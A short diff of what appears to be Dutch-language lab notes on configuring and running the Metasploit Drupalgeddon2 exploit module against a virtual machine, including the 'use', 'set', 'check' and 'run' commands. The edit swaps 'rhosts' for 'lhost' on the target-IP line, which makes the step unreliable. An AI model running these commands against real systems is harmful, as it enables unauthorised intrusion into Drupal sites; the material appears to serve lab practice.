@@ -79,7 +79,7 @@ use exploit/unix/webapp/drupal_drupalgeddon2
 - we gaan de exploit configureren.
 
 ```bash
-set rhosts xxx.xxx.xxx.xxx (ip van de vm)
+set lhost xxx.xxx.xxx.xxx (ip van de vm)
 set verbose true
 check
 run
